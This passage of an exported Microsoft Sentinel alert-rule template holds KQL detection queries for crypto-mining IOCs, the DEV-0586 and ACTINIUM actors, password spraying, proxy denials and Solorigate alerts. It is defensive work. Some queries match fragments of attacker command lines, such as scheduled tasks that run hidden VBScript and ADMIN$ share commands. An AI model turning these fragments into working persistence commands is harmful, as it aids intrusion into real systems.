TimeGenerated, UserAgent, Operation, RecordType, UserId, ClientIP, AlertDetail = 'Chia crypto IOC detected', Type\n| extend timestamp = TimeGenerated, IPEntity = ClientIP, Account = UserId\n),\n(DeviceNetworkEvents\n| where RemoteUrl has_any (domains) or RemoteIP in (IPList) or InitiatingProcessSHA256 in (sha256Hashes) or InitiatingProcessFileName has_any (process)\n| project TimeGenerated, ActionType, DeviceId, Computer = DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPEntity = RemoteIP,  AlertDetail = 'Chia crypto IOC detected'\n),\n(WindowsFirewall\n| where SourceIP in (IPList) or DestinationIP in (IPList) \n| project TimeGenerated, Computer, CommunicationDirection, SourceIP, DestinationIP, SourcePort, DestinationPort, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\"), AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, Computer, IPEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallDnsProxy\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with \"DNS Request: \" ClientIP \":\" ClientPort \" - \" QueryID \" \" Request_Type \" \" Request_Class \" \" Request_Name \". \" Request_Protocol \" \" Request_Size \" \" EDNSO_DO \" \" EDNS0_Buffersize \" \" Responce_Code \" \" Responce_Flags \" \" Responce_Size \" \" Response_Duration\n| where Request_Name has_any (domains)  or ClientIP in (IPList)\n| extend timestamp = TimeGenerated, DNSName = Request_Name, IPEntity = ClientIP, AlertDetail = 'Chia crypto IOC detected'\n),\n(AzureDiagnostics \n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where isnotempty(DestinationHost)\n| where DestinationHost has_any (domains)  \n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPEntity = SourceHost, AlertDetail = 'Chia crypto IOC detected'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| where EventDetail has_any (sha256Hashes) \n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256\n| extend Type = strcat(Type, \": \", Source), Account = UserName, FileHash = SHA256, Image = tostring(EventDetail.[4].[\"#text\"]), AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, Computer, Account, File = tostring(split(Image, '\\\\', -1)[-1]), FileHashAlgo = 'SHA256'\n| extend FilePath = replace_string(Image, File, '')\n),\n(DeviceFileEvents\n| where  InitiatingProcessFolderPath has_any (process)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256, Type\n| extend Account = RequestAccountName, Computer = DeviceName, IPAddress = RequestSourceIP, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, Computer, Account, File = InitiatingProcessFileName, FileHashAlgo = 'SHA256'\n| extend FilePath = replace_string(InitiatingProcessFolderPath, File, '')\n),\n(CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, AlertDetail = 'Chia crypto IOC detected', FileHashAlgo = 'SHA256', Account = SourceUserID\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| project TimeGenerated, EventDetail, UserName, Computer, Type\n| extend Image = tostring(EventDetail.[4].[\"#text\"]), CommandLine = tostring(EventDetail.[10].[\"#text\"]), Account = UserName, FileHash = tostring(EventDetail.[17].[\"#text\"]), AlertDetail = 'Chia crypto IOC detected'\n| where Image has_any (process)\n| extend timestamp = TimeGenerated, Computer, Account, File = tostring(split(Image, '\\\\', -1)[-1]), FileHashAlgo = 'SHA256'\n| extend FilePath= replace_string(Image, File, '')\n),\n(DeviceEvents\n| where  InitiatingProcessFileName has_any (process) or InitiatingProcessSHA256 in~ (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath, AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, Computer, Account, File = InitiatingProcessFileName, FileHashAlgo = 'SHA256'\n| extend FilePath = replace_string(InitiatingProcessFolderPath, File, '')\n),\n(SecurityEvent\n| where EventID == '4688'\n| where NewProcessName  has_any (process)\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type\n| extend timestamp = TimeGenerated, Computer, Account, File = tostring(split(NewProcessName, '\\\\', -1)[-1]), AlertDetail = 'Chia crypto IOC detected'\n| extend FilePath = replace_string(NewProcessName, File, '')\n)\n)\n| extend AccountCustomEntity = Account, HostCustomEntity = Computer, IPCustomEntity = IPEntity, FileCustomEntity = File, FilePathCustomEntity = FilePath, FileHashCustomEntity = FileHash",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "595a10c9-91be-4abb-bbc7-ae9c57848bef",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "FileCustomEntity"
                },
                {
                  "identifier": "Directory",
                  "columnName": "FilePathCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashAlgo"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b01c76e5-91b6-41e8-a1ed-4ca9f297a91b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b01c76e5-91b6-41e8-a1ed-4ca9f297a91b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DEV-0586 Actor IOC - January 2022",
          "description": "Identifies a match across IOC's related to an actor tracked by Microsoft as DEV-0586\n Refrence: https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/DEV-0586.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\nlet Command_Line = (iocs | where Type =~ \"CommandLine\" | project IoC);\n(union isfuzzy=true\n(DeviceProcessEvents\n| where InitiatingProcessSHA256 in (sha256Hashes) or SHA256 in (sha256Hashes) or ( InitiatingProcessCommandLine has ('127.0.0.1\\\\ADMIN$') and InitiatingProcessCommandLine has_any (Command_Line))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, AccountName, SHA256\n| extend Account = AccountName, Computer = DeviceName,  CommandLine = InitiatingProcessCommandLine, FileHash = case(InitiatingProcessSHA256 in (sha256Hashes), \"InitiatingProcessSHA256\", SHA256 in (sha256Hashes), \"SHA256\", \"No Match\")\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, FileHashCustomEntity = case(FileHash == \"InitiatingProcessSHA256\", InitiatingProcessSHA256, FileHash == \"SHA256\", SHA256, \"No Match\")\n),\n( SecurityEvent\n| where EventID == 4688\n| where ( CommandLine has (@'127.0.0.1\\\\ADMIN$') and CommandLine has_any (Command_Line))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type, EventID\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName\n),\n( CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, FileHashCustomEntity = 'SHA256', Account = SourceUserID\n),\n( imFileEvent\n| where Hash in~ (sha256Hashes) or  ( ActingProcessCommandLine has ('127.0.0.1\\\\ADMIN$') and ActingProcessCommandLine has_any (Command_Line))\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = TargetFileSHA256\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"], Hashes = tostring(EventDetail.[17].[\"#text\"])\n| extend Hashes = extract_all(@\"(?P<key>\\w+)=(?P<value>[a-zA-Z0-9]+)\", dynamic([\"key\",\"value\"]), Hashes)\n| extend Hashes = column_ifexists(\"Hashes\", \"\"), CommandLine = column_ifexists(\"CommandLine\", \"\")\n| where (Hashes has_any (sha256Hashes) ) or ( CommandLine has ('127.0.0.1\\\\ADMIN$') and CommandLine has_any (Command_Line)) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, Hashes, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), FileHashCustomEntity = Hashes\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "961b6a81-5c53-40b6-9800-4f661a8faea7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHash"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/76f38477-a060-4003-a0c5-c5866e62da33')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/76f38477-a060-4003-a0c5-c5866e62da33')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Password Spray Attack (Uses Authentication Normalization)",
          "description": "This query searches for failed attempts to log in from more than 15 various users within a 5 minute timeframe from the same source. This is a potential indication of a password spray attack\n To use this analytics rule, make sure you have deployed the [ASIM normalization parsers](https://aka.ms/ASimAuthentication)",
          "severity": "Medium",
          "enabled": true,
          "query": "let FailureThreshold = 15;\nimAuthentication\n| where EventType== 'Logon' and  EventResult== 'Failure'\n// reason: creds \n| where EventResultDetails in ('No such user or password', 'Incorrect password')\n| summarize UserCount=dcount(TargetUserId), Vendors=make_set(EventVendor), Products=make_set(EventVendor)\n  , Users = make_set(TargetUserId,100) \n    by SrcDvcIpAddr, SrcGeoCountry, bin(TimeGenerated, 5m)\n| where UserCount > FailureThreshold\n| extend timestamp = TimeGenerated, IPCustomEntity = SrcDvcIpAddr",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "6a2e2ff4-5568-475e-bef2-b95f12b9367b",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f50016e9-6dbc-42d9-8d27-1a54f46c32a1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f50016e9-6dbc-42d9-8d27-1a54f46c32a1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "ACTINIUM Actor IOCs - Feb 2022",
          "description": "Identifies a match across various data feeds for domains, hashes and commands related to an actor tracked by Microsoft as Actinium.",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/ActiniumIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\n(union isfuzzy=true\n(DeviceProcessEvents\n| where InitiatingProcessSHA256 in (sha256Hashes) or SHA256 in (sha256Hashes) or  (ProcessCommandLine has ('schtasks.exe /CREATE /sc minute /mo 12 /tn')  and ProcessCommandLine has ('/tr \"wscript.exe') and ProcessCommandLine has ('\"%PUBLIC%\\\\Pictures\\\\') and ProcessCommandLine has ('//e:VBScript //b\" /F')) or (ProcessCommandLine has ('wscript.exe C:\\\\Users\\\\') and ProcessCommandLine has ('.wav') and  ProcessCommandLine has ('//e:VBScript //b') \nor (ProcessCommandLine has_all (\"schtasks.exe\", \"create\", \"wscript\", \"e:vbscript\", \".wav\")))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, ProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, InitiatingProcessFolderPath, ProcessId, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName,  InitiatingProcessSHA256, Type, AccountName, SHA256, FileName\n| extend Account = AccountName, Computer = DeviceName,  FileHash = case(InitiatingProcessSHA256 in (sha256Hashes), \"InitiatingProcessSHA256\", SHA256 in (sha256Hashes), \"SHA256\", \"No Match\")\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = FileName, FileHashCustomEntity = case(FileHash == \"InitiatingProcessSHA256\", InitiatingProcessSHA256, FileHash == \"SHA256\", SHA256, \"No Match\")\n),\n( SecurityEvent\n| where EventID == 4688\n| where (CommandLine has ('schtasks.exe /CREATE /sc minute /mo 12 /tn')  and CommandLine has ('/tr \"wscript.exe') and CommandLine has ('\"%PUBLIC%\\\\Pictures\\\\') and CommandLine has ('//e:VBScript //b\" /F')) or (CommandLine has ('wscript.exe C:\\\\Users\\\\') and CommandLine has ('.wav') and  CommandLine has ('//e:VBScript //b'))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type, EventID\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName\n),\n( CommonSecurityLog\n| where FileHash in (sha256Hashes)\n| project TimeGenerated, Message, SourceUserID, FileHash, Type\n| extend timestamp = TimeGenerated, FileHashCustomEntity = 'SHA256', Account = SourceUserID\n),\n( imFileEvent\n| where Hash in~ (sha256Hashes) or  (ActingProcessCommandLine  has ('schtasks.exe /CREATE /sc minute /mo 12 /tn')  and ActingProcessCommandLine  has ('/tr \"wscript.exe') and ActingProcessCommandLine  has ('\"%PUBLIC%\\\\Pictures\\\\') and ActingProcessCommandLine  has ('//e:VBScript //b\" /F')) or (ActingProcessCommandLine  has ('wscript.exe C:\\\\Users\\\\') and ActingProcessCommandLine  has ('.wav') and  ActingProcessCommandLine  has ('//e:VBScript //b') \n or (ActingProcessCommandLine has_all (\"schtasks.exe\", \"create\", \"wscript\", \"e:vbscript\", \".wav\")))\n| extend Account = ActorUsername, Computer = DvcHostname, IPAddress = SrcIpAddr, CommandLine = ActingProcessCommandLine, FileHash = Hash\n| project Type, TimeGenerated, Computer, Account, IPAddress, CommandLine, FileHash\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"], Hashes = tostring(EventDetail.[17].[\"#text\"])\n| extend Hashes = extract_all(@\"(?P<key>\\w+)=(?P<value>[a-zA-Z0-9]+)\", dynamic([\"key\",\"value\"]), Hashes)\n| extend Hashes = column_ifexists(\"Hashes\", \"\"), CommandLine = column_ifexists(\"CommandLine\", \"\")\n| where (Hashes has_any (sha256Hashes) ) or (CommandLine has ('schtasks.exe /CREATE /sc minute /mo 12 /tn')  and CommandLine has ('/tr \"wscript.exe') and CommandLine has ('\"%PUBLIC%\\\\Pictures\\\\') and CommandLine has ('//e:VBScript //b\" /F')) or (CommandLine has ('wscript.exe C:\\\\Users\\\\') and CommandLine has ('.wav') and  CommandLine has ('//e:VBScript //b') or (CommandLine has_all (\"schtasks.exe\", \"create\", \"wscript\", \"e:vbscript\", \".wav\")))\n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, Hashes, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source)\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), FileHashCustomEntity = Hashes\n),\n\n(DeviceNetworkEvents \n| where isnotempty(RemoteUrl) \n| where RemoteUrl  in~ (domains)  \n| project Type, TimeGenerated, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessAccountName\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, DNSName = RemoteUrl, IPCustomEntity = RemoteIP\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": "825991eb-ea39-4590-9de2-ee97ef42eb93",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHash"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8f880b74-181b-48d7-b64b-79c22e7f7ead')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8f880b74-181b-48d7-b64b-79c22e7f7ead')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Excessive Denied Proxy Traffic",
          "description": "This alert creates an incident when a client generates an excessive amounts of denied proxy traffic.",
          "severity": "Low",
          "enabled": false,
          "query": "\nlet threshold = 100;\nSymantecProxySG \n| where sc_filter_result =~ \"DENIED\"\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), count() by c_ip, cs_host\n| where count_ > threshold\n| extend timestamp = StartTime, HostCustomEntity = cs_host, IPCustomEntity = c_ip\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/52b1a20a-d492-4028-88de-1bfa63a95e25')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/52b1a20a-d492-4028-88de-1bfa63a95e25')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User Accessed Suspicious URL Categories",
          "description": "Creates an incident in the event the requested URL accessed by the user has been identified as Suspicious, Phishing, or Hacking.",
          "severity": "Medium",
          "enabled": false,
          "query": "\nSymantecProxySG\n| mv-expand cs_categories\n| where cs_categories has_any (\"Suspicious\",\"phishing\", \"hacking\")\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), count() by sc_filter_result, cs_userdn, c_ip, cs_host, Computer,  tostring(cs_categories)\n| extend timestamp = StartTime, AccountCustomEntity = cs_userdn, IPCustomEntity = c_ip, HostCustomEntity = Computer\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/26d65b72-eb5c-4597-91d1-e4ebe9001684')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/26d65b72-eb5c-4597-91d1-e4ebe9001684')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Solorigate Defender Detections",
          "description": "Surfaces any Defender Alert for Solorigate Events. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as \n Device group, ip, logged on users etc. This way, the Microsoft Sentinel user can have all the pertinent device info in one view for all the the Solarigate Defender alerts.",
          "severity": "High",
          "enabled": true,
          "query": "DeviceInfo\n| extend DeviceName = tolower(DeviceName)\n| join (SecurityAlert\n| where ProviderName =~ \"MDATP\"\n| extend ThreatName = tostring(parse_json(ExtendedProperties).ThreatName)\n| where ThreatName has \"Solorigate\"\n| extend HostCustomEntity = tolower(CompromisedEntity)\n) on $left.DeviceName == $right.HostCustomEntity\n| project TimeGenerated, DisplayName, ThreatName, CompromisedEntity, PublicIP, MachineGroup, AlertSeverity, Description, LoggedOnUsers, DeviceId, TenantId, HostCustomEntity\n| extend timestamp = TimeGenerated, IPCustomEntity = PublicIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1195"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "e70fa6e0-796a-4e85-9420-98b17b0bb749",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
